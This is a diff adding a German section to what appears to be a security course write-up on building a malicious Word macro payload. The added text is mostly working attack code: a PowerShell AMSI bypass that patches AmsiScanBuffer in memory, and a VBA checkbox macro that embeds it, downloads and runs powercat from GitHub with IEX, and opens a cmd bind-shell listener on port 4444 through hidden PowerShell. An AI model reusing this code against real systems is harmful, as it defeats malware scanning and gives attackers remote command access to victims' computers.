@@ -81,6 +81,122 @@ zur Eingabe bei Öffnen des Dokumentes)
 
 ## Der Payload
 
+* probierte Varianten, die nicht funktioniert haben:
+  * Nachladen des AMSI-Bypass Scriptes aus dem Internet
+    * Bei Ausführen von Strings, die aus dem Internet stammen
+    springt unterbindet Word die Ausführung mit einer Warnmeldung an den User
+  * Laden des AMSI-Bypass Scriptes aus den Properties (Comment-Feld)
+    * gleiches Problem wie beim Nachladen aus dem Internet
+    * Ausführen von Strings ist ok, Nachladen von Strings aus dem Internet
+    ebenso, eine Kombination dagegen nicht
+* letztendlich verwendete Variante:
+  * modifiziertes AMSI-Bypass Script direkt in VBA als String speichern
+* aufgetretene Probleme:
+  * finden eines aktuellen AMSI-Bypass Scriptes, welches nicht erkannt wird
+  * korrektes Escapen des Scripts (in VBA String gefolgt von Ausführung mit
+  `powershell -c`)
+  * VBA Limitierungen (Line-Continuation Limit, Escape Eigenheiten, keine Multi-Line Strings)
+
+Zuerst wurden [amsi.fail](https://amsi.fail/) Methoden (regulär und kodiert)
+direkt in einer Powerhsell ausprobiert, welche bei mir allerdings durchwegs
+erkannt wurden. Zum Beispiel *Matt Graebers Reflection method*:
+
+![image](https://user-images.githubusercontent.com/173962/155932498-8bd13ac0-6573-4b27-8008-94a491ec954e.png)
+
+Eine der vorgeschlagenen Methoden (Rastamouse) wurde zwar aktualisiert,
+aber noch nicht in den AMSI-Fail-Generator aufgenommen:<br>
+https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
+
+Das aktualisierte Script sieht folgendermaßen aus:
+
+```powershell
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
+$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
+$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
+$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+#0:  31 c0                   xor    eax,eax
+#2:  05 78 01 19 7f          add    eax,0x7f190178
+#7:  05 df fe ed 00          add    eax,0xedfedf
+#c:  c3                      ret 
+#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+```
+
+Dieses Script funktioniert bei aktuellem Patchstand (2022-02-28) noch immer:
+
+![image](https://user-images.githubusercontent.com/173962/155933520-813cb214-af01-4e4f-90d5-cd07ef62120b.png)
+
+Nach dem Strippen von Kommentaren und Newlines sowie dem doppeltem Escapen
+(ergibt sich das
+folgende VBA Script, was an die Checkbox geh
+
+```vba
+Private Sub CheckBox1_Click()
+
+    Dim asmi As String
+
+    ' disable AMSI for process:
+    amsi = "$Win32 = @'" & vbNewLine & _
+    "using System;" & vbNewLine & _
+    "using System.Runtime.InteropServices;" & vbNewLine & _
+    "public class Win32 {" & vbNewLine & _
+    "[DllImport(\""kernel32\"")]" & vbNewLine & _
+    "public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);" & vbNewLine & _
+    "[DllImport(\""kernel32\"")]" & vbNewLine & _
+    "public static extern IntPtr LoadLibrary(string name);" & vbNewLine & _
+    "[DllImport(\""kernel32\"")]" & vbNewLine & _
+    "public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" & vbNewLine & _
+    "}" & vbNewLine & _
+    "'@" & vbNewLine & _
+    "Add-Type $Win32" & vbNewLine & _
+    "$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)" & vbNewLine & _
+    "$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))" & vbNewLine & _
+    "$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)" & vbNewLine & _
+    "$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))" & vbNewLine & _
+    "$p = 0" & vbNewLine & _
+    "[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)" & vbNewLine & _
+    "$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)" & vbNewLine & _
+    "[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)" & vbNewLine & _
+    ""
+
+    Dim code As String
+
+    ' download powercat and start a shell listener with it:
+    code = amsi & vbNewLine & _
+    "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')" & vbNewLine & _
+    "powercat -l -p 4444 -e cmd -v" & vbNewLine & _
+    "#pause" & vbNewLine & _
+    ""
+
+    Set WshShell = CreateObject("WScript.Shell")
+    'WshShell.Run ("pwershell -noexit -c " + code) ' for debugging
+    WshShell.Run ("powershell -windowstyle hidden -c " + code)
+
+End Sub
+```
+
 <!-- # Aufgabe 2, Egghunter (2P) -->
 
 <!-- **Aufgabenstellung** -->
